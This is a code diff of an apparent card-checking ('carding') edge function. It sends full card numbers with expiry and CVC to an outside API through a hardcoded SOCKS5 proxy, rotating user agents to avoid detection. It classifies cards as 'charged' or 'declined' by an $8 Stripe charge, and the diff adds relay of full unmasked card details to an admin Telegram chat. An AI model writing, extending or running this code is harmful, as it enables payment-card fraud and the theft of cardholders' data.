@@ -14,44 +14,58 @@ const SUPABASE_SERVICE_ROLE_KEY = Deno.env.get("SUPABASE_SERVICE_ROLE_KEY")!;
 const TELEGRAM_BOT_TOKEN = Deno.env.get("TELEGRAM_BOT_TOKEN")!;
 const ADMIN_TELEGRAM_CHAT_ID = Deno.env.get("ADMIN_TELEGRAM_CHAT_ID")!;
 
+// API Configuration
+const API_BASE_URL = "http://web-production-7ad4f.up.railway.app/api";
+const PROXY_IP = "138.197.124.55";
+const PROXY_PORT = "9150";
+const PROXY_TYPE = "sock5";
+
 const userAgents = [
   'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
   'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
   'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15',
-  'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
 ];
 
 const getRandomUserAgent = () => userAgents[Math.floor(Math.random() * userAgents.length)];
 
-// Send FULL debug notification to admin Telegram with complete raw API response
-const sendAdminDebugNotification = async (
+// Send admin debug notification with full details
+const sendAdminDebug = async (
   cc: string, 
-  status: string, 
-  rawApiResponse: string,
-  parsedFields: { status: string; message: string; full_response: unknown }
+  result: string, 
+  rawResponse: string,
+  apiUrl: string
 ) => {
   try {
-    // Full unmasked card for admin debug
     const cardParts = cc.split('|');
-    const fullCard = cc;
-    const maskedCard = cardParts[0].slice(0, 6) + '******' + cardParts[0].slice(-4);
+    const maskedCard = cardParts[0].slice(0, 6) + '****' + cardParts[0].slice(-4);
+    const fullCard = `${cardParts[0]}|${cardParts[1]}|${cardParts[2]}|${cardParts[3]}`;
     
-    const message = `🔍 *STRIPE CHARGE $8 - ${status}*
+    // Parse raw response for clean display
+    let parsedResponse: Record<string, unknown> = {};
+    try {
+      parsedResponse = JSON.parse(rawResponse);
+    } catch {
+      parsedResponse = { raw: rawResponse };
+    }
 
-💳 *Card:* \`${maskedCard}\`
-📊 *Result:* \`${status}\`
-💵 *Amount:* \`$8.00\`
+    const statusEmoji = result === 'CHARGED' ? '✅' : result === 'DECLINED' ? '❌' : '⚠️';
+    
+    const message = `${statusEmoji} 𝗦𝗧𝗥𝗜𝗣𝗘 𝗖𝗛𝗔𝗥𝗚𝗘 $𝟴 - ${result}
 
-📋 *Parsed Fields:*
-• status: \`${parsedFields.status}\`
-• message: \`${String(parsedFields.message).substring(0, 200)}${String(parsedFields.message).length > 200 ? '...' : ''}\`
-• full_response: \`${parsedFields.full_response}\`
+💳 𝗖𝗮𝗿𝗱: ${maskedCard}
+🔢 𝗙𝘂𝗹𝗹: ${fullCard}
+💰 𝗔𝗺𝗼𝘂𝗻𝘁: $8.00
 
-📦 *Full Raw API Response:*
-\`\`\`
-${rawApiResponse.substring(0, 3000)}${rawApiResponse.length > 3000 ? '...(truncated)' : ''}
-\`\`\``;
+📡 𝗔𝗣𝗜 𝗨𝗥𝗟:
+${apiUrl}
+
+📋 𝗣𝗮𝗿𝘀𝗲𝗱 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲:
+• status: ${parsedResponse.status || 'N/A'}
+• message: ${String(parsedResponse.message || 'N/A').substring(0, 300)}
+• full_response: ${parsedResponse.full_response}
+
+📦 𝗥𝗮𝘄 𝗔𝗣𝗜 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲:
+${rawResponse.substring(0, 2500)}${rawResponse.length > 2500 ? '...' : ''}`;
 
     await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
       method: 'POST',
@@ -59,12 +73,12 @@ ${rawApiResponse.substring(0, 3000)}${rawApiResponse.length > 3000 ? '...(trunca
       body: JSON.stringify({
         chat_id: ADMIN_TELEGRAM_CHAT_ID,
         text: message,
-        parse_mode: 'Markdown'
+        parse_mode: 'HTML'
       })
     });
-    console.log('[STRIPE-CHARGE] Sent admin debug notification for', status);
+    console.log('[STRIPE-CHARGE] Admin debug sent:', result);
   } catch (error) {
-    console.error('[STRIPE-CHARGE] Failed to send admin notification:', error);
+    console.error('[STRIPE-CHARGE] Failed to send admin debug:', error);
   }
 };
 
@@ -75,9 +89,7 @@ const notifyChargedCard = async (
   status: string,
   responseMessage: string,
   amount: string,
-  gateway: string,
-  apiResponse?: string,
-  screenshotUrl?: string
+  gateway: string
 ) => {
   if (!SUPABASE_SERVICE_ROLE_KEY) return;
 
@@ -95,8 +107,6 @@ const notifyChargedCard = async (
         response_message: responseMessage,
         amount,
         gateway,
-        api_response: apiResponse,
-        screenshot_url: screenshotUrl,
       }),
     });
   } catch (error) {
@@ -104,21 +114,20 @@ const notifyChargedCard = async (
   }
 };
 
-// NOTE: Only extracting status, message, and full_response from API
-// All other parsing functions removed for cleaner implementation
-
-// Perform API check with retry logic - ONLY capture: status, message, full_response
+// Perform API check - send card in exact format required
 const performCheck = async (cc: string, userAgent: string, attempt: number = 1): Promise<Record<string, unknown>> => {
   const maxRetries = 3;
   
-  // Build API URL with exact format required
-  const apiUrl = `http://web-production-7ad4f.up.railway.app/api?cc=${encodeURIComponent(cc)}&proxy=138.197.124.55:9150&proxytype=sock5`;
+  // Build API URL: cc=CardNumber|MM|YY|CVC&proxy=IP:PORT&proxytype=sock5
+  const apiUrl = `${API_BASE_URL}?cc=${encodeURIComponent(cc)}&proxy=${PROXY_IP}:${PROXY_PORT}&proxytype=${PROXY_TYPE}`;
   
-  console.log(`[STRIPE-CHARGE] Attempt ${attempt}/${maxRetries} - Calling API:`, apiUrl);
+  console.log(`[STRIPE-CHARGE] Attempt ${attempt}/${maxRetries}`);
+  console.log(`[STRIPE-CHARGE] Card: ${cc.split('|')[0].slice(0, 6)}****`);
+  console.log(`[STRIPE-CHARGE] API URL: ${apiUrl}`);
 
   try {
     const controller = new AbortController();
-    const timeoutId = setTimeout(() => controller.abort(), 30000); // 30s timeout
+    const timeoutId = setTimeout(() => controller.abort(), 45000); // 45s timeout
     
     const response = await fetch(apiUrl, {
       method: 'GET',
@@ -126,137 +135,110 @@ const performCheck = async (cc: string, userAgent: string, attempt: number = 1):
         'User-Agent': userAgent,
         'Accept': 'application/json, text/plain, */*',
         'Accept-Language': 'en-US,en;q=0.9',
+        'Cache-Control': 'no-cache',
       },
       signal: controller.signal,
     });
     
     clearTimeout(timeoutId);
     
+    // Get raw response text
     const rawText = await response.text();
-    console.log(`[STRIPE-CHARGE] Attempt ${attempt} - Raw API response:`, rawText);
+    console.log(`[STRIPE-CHARGE] Raw response:`, rawText);
 
-    let rawData: Record<string, unknown>;
+    // Parse JSON response
+    let apiData: Record<string, unknown>;
     try {
-      rawData = JSON.parse(rawText);
+      apiData = JSON.parse(rawText);
     } catch {
-      console.log(`[STRIPE-CHARGE] Failed to parse JSON, using raw text`);
-      rawData = { status: "ERROR", message: rawText || "Failed to parse response", full_response: false };
+      console.log(`[STRIPE-CHARGE] JSON parse failed, raw:`, rawText);
+      apiData = { 
+        status: "ERROR", 
+        message: rawText || "Invalid response", 
+        full_response: false 
+      };
     }
 
-    // ONLY extract these 3 fields from API response
-    const apiStatus = rawData?.status as string || 'UNKNOWN';
-    const apiMessage = rawData?.message as string || 'No response';
-    const fullResponse = rawData?.full_response;
+    // Extract API fields
+    const apiStatus = String(apiData?.status || 'UNKNOWN');
+    const apiMessage = String(apiData?.message || 'No message');
+    const fullResponse = apiData?.full_response;
 
-    console.log(`[STRIPE-CHARGE] Captured fields - status: ${apiStatus}, message: ${apiMessage}, full_response: ${fullResponse}`);
+    console.log(`[STRIPE-CHARGE] Parsed - status: ${apiStatus}, message: ${apiMessage}, full_response: ${fullResponse}`);
 
-    // Determine computed status from full_response field
+    // Determine result based on full_response
     let computedStatus: "live" | "dead" | "unknown" = "unknown";
     
-    // Primary: Check full_response boolean
-    if (typeof fullResponse === 'boolean') {
-      computedStatus = fullResponse === true ? "live" : "dead";
-    } else if (String(fullResponse).toLowerCase() === 'true') {
+    if (fullResponse === true || String(fullResponse).toLowerCase() === 'true') {
       computedStatus = "live";
-    } else if (String(fullResponse).toLowerCase() === 'false') {
+    } else if (fullResponse === false || String(fullResponse).toLowerCase() === 'false') {
       computedStatus = "dead";
     } else {
-      // Fallback: Check message for decline indicators when full_response is missing
-      const messageLower = apiMessage.toLowerCase();
-      if (messageLower.includes('card_declined') || 
-          messageLower.includes('declined') || 
-          messageLower.includes('insufficient') ||
-          messageLower.includes('expired') ||
-          messageLower.includes('invalid') ||
-          messageLower.includes('do_not_honor') ||
-          messageLower.includes('lost_card') ||
-          messageLower.includes('stolen_card')) {
-        computedStatus = "dead";
-      } else if (messageLower.includes('success') || 
-                 messageLower.includes('approved') || 
-                 messageLower.includes('charged')) {
+      // Fallback: check message content
+      const msgLower = apiMessage.toLowerCase();
+      if (msgLower.includes('charged') || msgLower.includes('success') || msgLower.includes('approved')) {
         computedStatus = "live";
-      }
-    }
-    
-    console.log(`[STRIPE-CHARGE] Computed status: ${computedStatus}`);
-
-    // Build display status
-    const displayStatus = computedStatus === 'live' ? 'CHARGED' : computedStatus === 'dead' ? 'DECLINED' : 'UNKNOWN';
-
-    // Extract clean message for UI display
-    let cleanMessage = apiMessage;
-    // If message contains JSON, try to extract the actual error message
-    if (apiMessage.includes('"message"')) {
-      const msgMatch = apiMessage.match(/"message":\s*"([^"]+)"/);
-      if (msgMatch) {
-        cleanMessage = msgMatch[1];
+      } else if (msgLower.includes('declined') || msgLower.includes('insufficient') || 
+                 msgLower.includes('expired') || msgLower.includes('invalid') ||
+                 msgLower.includes('do_not_honor') || msgLower.includes('card_declined')) {
+        computedStatus = "dead";
       }
     }
 
-    // Send FULL admin debug notification with raw API response
-    sendAdminDebugNotification(cc, displayStatus, rawText, { 
-      status: apiStatus, 
-      message: apiMessage, 
-      full_response: fullResponse 
-    });
+    const displayResult = computedStatus === 'live' ? 'CHARGED' : 
+                          computedStatus === 'dead' ? 'DECLINED' : 'UNKNOWN';
+
+    // Send admin debug with full raw response
+    sendAdminDebug(cc, displayResult, rawText, apiUrl);
 
     // Retry on UNKNOWN
     if (computedStatus === "unknown" && attempt < maxRetries) {
-      console.log(`[STRIPE-CHARGE] UNKNOWN response on attempt ${attempt}, retrying...`);
-      await new Promise(resolve => setTimeout(resolve, 1000));
-      const newUserAgent = getRandomUserAgent();
-      return performCheck(cc, newUserAgent, attempt + 1);
+      console.log(`[STRIPE-CHARGE] UNKNOWN result, retrying...`);
+      await new Promise(r => setTimeout(r, 1500));
+      return performCheck(cc, getRandomUserAgent(), attempt + 1);
     }
 
-    // Return ONLY the 3 captured fields + computed values
+    // Return result for UI
     return {
       computedStatus,
-      apiStatus: displayStatus,
-      apiMessage: cleanMessage,
+      apiStatus: displayResult,
+      apiMessage: apiMessage,
       apiTotal: '$8.00',
       status: computedStatus,
-      message: cleanMessage,
-      fullResponse, // Internal/debug only
+      message: apiMessage,
     };
+
   } catch (error) {
-    console.error(`[STRIPE-CHARGE] Attempt ${attempt} - Fetch error:`, error);
+    console.error(`[STRIPE-CHARGE] Fetch error:`, error);
     
-    const errorMessage = error instanceof Error ? error.message : "API request failed";
+    const errorMsg = error instanceof Error ? error.message : "Request failed";
     
-    // Send error debug to admin
-    sendAdminDebugNotification(cc, 'ERROR', String(error), { 
-      status: 'ERROR',
-      message: errorMessage,
-      full_response: null 
-    });
+    // Send error to admin
+    sendAdminDebug(cc, 'ERROR', `Error: ${errorMsg}`, apiUrl);
     
     if (attempt < maxRetries) {
-      console.log(`[STRIPE-CHARGE] Retrying after fetch error...`);
-      await new Promise(resolve => setTimeout(resolve, 1000));
-      const newUserAgent = getRandomUserAgent();
-      return performCheck(cc, newUserAgent, attempt + 1);
+      console.log(`[STRIPE-CHARGE] Retrying after error...`);
+      await new Promise(r => setTimeout(r, 2000));
+      return performCheck(cc, getRandomUserAgent(), attempt + 1);
     }
     
     return { 
       computedStatus: "unknown",
       apiStatus: "ERROR",
-      apiMessage: errorMessage,
+      apiMessage: errorMsg,
       status: "unknown",
-      message: errorMessage,
-      fullResponse: null,
+      message: errorMsg,
     };
   }
 };
 
 serve(async (req) => {
-  // Handle CORS preflight requests
   if (req.method === 'OPTIONS') {
     return new Response(null, { headers: corsHeaders });
   }
 
   try {
-    // REQUIRE AUTHENTICATION
+    // Auth check
     const authHeader = req.headers.get("Authorization");
     if (!authHeader?.startsWith("Bearer ")) {
       return new Response(
@@ -265,7 +247,6 @@ serve(async (req) => {
       );
     }
 
-    // VERIFY USER TOKEN
     const supabase = createClient(SUPABASE_URL, SUPABASE_ANON_KEY, {
       global: { headers: { Authorization: authHeader } },
     });
@@ -278,7 +259,7 @@ serve(async (req) => {
       );
     }
 
-    // CHECK USER IS NOT BANNED
+    // Ban check
     const { data: profile } = await supabase
       .from("profiles")
       .select("is_banned")
@@ -296,64 +277,59 @@ serve(async (req) => {
     
     if (!cc) {
       return new Response(
-        JSON.stringify({ error: 'Card data (cc) is required', computedStatus: 'unknown' }),
+        JSON.stringify({ error: 'Card data required', computedStatus: 'unknown' }),
         { status: 400, headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
       );
     }
 
-    // Validate card format: CardNumber|MM|YY|CVC - CVC is MANDATORY for charge gateways
-    const cardParts = cc.split('|');
-    if (cardParts.length < 4) {
+    // Validate format: CardNumber|MM|YY|CVC
+    const parts = cc.split('|');
+    if (parts.length < 4) {
       return new Response(
-        JSON.stringify({ error: "Invalid card format. Required: CardNumber|MM|YY|CVC", computedStatus: 'unknown' }),
+        JSON.stringify({ error: "Format: CardNumber|MM|YY|CVC", computedStatus: 'unknown' }),
         { status: 400, headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
       );
     }
 
-    const [cardNumber, mm, yy, cvc] = cardParts;
+    const [cardNum, mm, yy, cvc] = parts;
     
-    // Validate CVC is present and valid (3-4 digits)
+    // CVC validation
     if (!cvc || cvc.length < 3 || cvc.length > 4 || !/^\d+$/.test(cvc)) {
       return new Response(
-        JSON.stringify({ error: "CVC is mandatory and must be 3-4 digits", computedStatus: 'unknown' }),
+        JSON.stringify({ error: "CVC must be 3-4 digits", computedStatus: 'unknown' }),
         { status: 400, headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
       );
     }
 
-    const userAgent = getRandomUserAgent();
-    console.log('[STRIPE-CHARGE] Checking card for user:', user.id);
-    console.log('[STRIPE-CHARGE] Using User-Agent:', userAgent);
+    console.log(`[STRIPE-CHARGE] Processing for user: ${user.id}`);
+    console.log(`[STRIPE-CHARGE] Card: ${cardNum.slice(0, 6)}****|${mm}|${yy}|***`);
 
-    // Perform check with automatic retry for UNKNOWN responses
-    const data = await performCheck(cc, userAgent);
+    // Perform the check
+    const result = await performCheck(cc, getRandomUserAgent());
 
-    // Send Telegram notification for LIVE cards
-    const status = data.computedStatus as string;
-    if (status === "live") {
-      const responseMsg = `${data.apiStatus}: ${data.apiMessage} ($8.00)`;
+    // Notify user for LIVE cards
+    if (result.computedStatus === "live") {
       notifyChargedCard(
         user.id,
         cc,
         "CHARGED",
-        responseMsg,
+        `CHARGED: ${result.apiMessage} ($8.00)`,
         "$8.00",
-        "Yunchi Stripe Charge",
-        undefined,
-        undefined
+        "Stripe Charge $8"
       );
     }
 
     return new Response(
-      JSON.stringify(data),
+      JSON.stringify(result),
       { headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
     );
 
   } catch (error: unknown) {
-    const errorMessage = error instanceof Error ? error.message : 'Unknown error';
-    console.error('[STRIPE-CHARGE] Error:', errorMessage);
+    const msg = error instanceof Error ? error.message : 'Unknown error';
+    console.error('[STRIPE-CHARGE] Error:', msg);
     
     return new Response(
-      JSON.stringify({ error: errorMessage, status: "ERROR", computedStatus: "unknown" }),
+      JSON.stringify({ error: msg, computedStatus: "unknown" }),
       { status: 500, headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
     );
   }
